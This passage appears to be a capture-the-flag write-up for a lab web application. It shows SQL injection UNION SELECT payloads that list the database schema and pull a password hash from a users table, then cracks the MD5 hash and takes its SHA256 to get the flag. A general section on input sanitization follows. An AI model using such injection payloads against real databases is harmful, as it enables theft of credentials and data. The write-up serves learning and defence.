
5 UNION SELECT table_name, column_name FROM information_schema.columns

Commentaire countersign

ID: 5 UNION SELECT Commentaire, countersign FROM users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

[md5_decrypt](https://www.md5online.org/md5-decrypt.html) (5ff9d0165b4f92b14994e5c685cdce28) = tolower(FortyTwo) = fortytwo

[Sha256](https://md5decrypt.net/en/Sha256/)(fortytwo) = `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## # Prevention

Sanitizing inputs refers to the process of validating and cleaning user-provided data before using it in an application or storing it in a database. The purpose of input sanitization is to ensure the integrity, security, and stability of the application by preventing potentially harmful or unexpected data from causing issues.

When users interact with an application, they can input various types of data, such as text, numbers, files, or other forms of input. However, this data may not always be reliable, and malicious users may attempt to exploit vulnerabilities or disrupt the application's functionality.

Input sanitization involves validating and cleaning the input data to ensure it conforms to expected formats, types, and constraints. This process typically includes the following steps:

1. Validation: Checking the input data to ensure it meets specific criteria, such as length limits, required fields, allowed character sets, or numeric ranges. Validation helps ensure the input is valid and appropriate for the application's needs.
2. Filtering: Removing or neutralizing potentially harmful or unwanted elements from the input. This may involve removing special characters, HTML tags, or scripts that could be used for injection attacks or malicious code execution.
3. Encoding: Converting characters or symbols that have special meanings in the context of the application to their encoded representations. This prevents the interpreted execution of potentially dangerous characters or code.